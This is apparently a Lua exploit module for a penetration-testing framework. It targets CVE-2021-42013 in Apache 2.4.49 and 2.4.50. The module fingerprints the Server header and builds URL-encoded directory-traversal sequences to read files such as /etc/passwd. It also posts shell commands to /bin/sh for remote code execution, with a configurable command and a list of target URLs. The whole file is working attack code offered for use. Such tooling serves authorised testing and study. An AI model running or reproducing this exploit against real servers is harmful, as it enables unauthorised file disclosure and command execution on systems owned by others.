local c = require("colors")
local http = require("http_req")

---@type LuaTool
return {
  name = "apache-42013",
  version = "1.0.0",
  description = "Apache 2.4.49/2.4.50 Path Traversal and Remote Code Execution",
  uuid = "0b9155fd-d343-43d9-876b-3d3923aeca7c",
  tags = { "cve-2021-42013" },
  vars = {
    target = "http://127.0.0.1:80",
    mode = "pt",
    pt = "/etc/passwd",
    rce = "/bin/sh",
    dds_count = 10,
    payload = "id",
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
  },
  desc = {
    target = "Target URL (e.g., http://127.0.0.1:80,http://example.com:8080)",
    mode = "Mode of operation: 'pt' for Path Traversal, 'rce' for Remote Code Execution",
    pt = "Path Traversal payload (e.g., /etc/passwd)",
    rce = "Remote Code Execution payload (e.g., /bin/sh)",
    dds_count = "Number of directory traversal sequences to prepend (e.g., 10)",
    payload = "Command to execute on the target (e.g., id)",
    useragent = "User-Agent header to use in the HTTP request",
  },
  rootRequired = false,
  makeCommand = true,
  initialize = function()
    explo.info("Initializing Apache 2.4.49/2.4.50 PT and RCE")
  end,
  shutdown = function()
    explo.info("Shuting down Apache 2.4.49/2.4.50 PT and RCE")
  end,
  execute = function()
    local payload_prefix = "echo"

    local target = explo.getVar("target")
    local port = explo.getVar("port")
    local mode = explo.getVar("mode")
    local pt = explo.getVar("pt")
    local rce = explo.getVar("rce")
    local dds_count = explo.getVar("dds_count")
    local payload = explo.getVar("payload")
    local useragent = explo.getVar("useragent")

    if
      type(target) ~= "string"
      or type(port) ~= "number"
      or type(mode) ~= "string"
      or type(pt) ~= "string"
      or type(rce) ~= "string"
      or type(dds_count) ~= "number"
      or type(payload) ~= "string"
      or type(useragent) ~= "string"
    then
      explo.error("Invalid variable types")
      return
    end

    for w in target:gmatch("[^,]+") do
      ---@type HTTPConfig
      local cfg = {}
      cfg.url = w
      cfg.headers = {
        ["User-Agent"] = useragent,
      }

      local response, err = http.get(cfg)
      if err then
        explo.error("HTTP request failed: " .. err)
        return
      end
      if not response then
        explo.error("No response received from " .. w)
        return
      end
      local dds = ""
      if response.headers["Server"] and response.headers["Server"]:match("Apache/2.4.49") then
        explo.info("Target " .. w .. " is running Apache 2.4.49")
        dds = "/.%2e"
      elseif response.headers["Server"] and response.headers["Server"]:match("Apache/2.4.50") then
        explo.info("Target " .. w .. " is running Apache 2.4.50")
        dds = "/.%%32%65"
      else
        explo.error("Target " .. w .. " is not running Apache 2.4.49 or 2.4.50")
        return
      end

      if mode == "pt" then
        cfg.url = cfg.url .. dds:rep(dds_count) .. pt
        response, err = http.get(cfg)
        if err then
          explo.error("HTTP request failed: " .. err)
          return
        end
        if not response then
          explo.error("No response received from " .. w)
          return
        end
        if response.status_code == 200 then
          explo.info("Path Traversal successful on " .. w)
          explo.info("Response: " .. response.body)
        else
          explo.error("Path Traversal failed on " .. w)
        end
      end

      if mode == "rce" then
        cfg.url = cfg.url .. dds:rep(dds_count) .. rce
        cfg.body = payload_prefix .. " " .. payload
        local rce_response = http.post(cfg)
        if not rce_response then
          explo.error("No response received from RCE on " .. w)
          return
        end
        if rce_response.status_code == 200 then
          explo.info("RCE successful on " .. w)
          explo.info("Response: " .. rce_response.body)
          print(c.fg.green .. "RCE successful on " .. w .. c.reset)
        else
          explo.error("RCE failed on " .. w)
          print(c.fg.red .. "RCE failed on " .. w .. c.reset)
        end
      end
    end
  end,
}
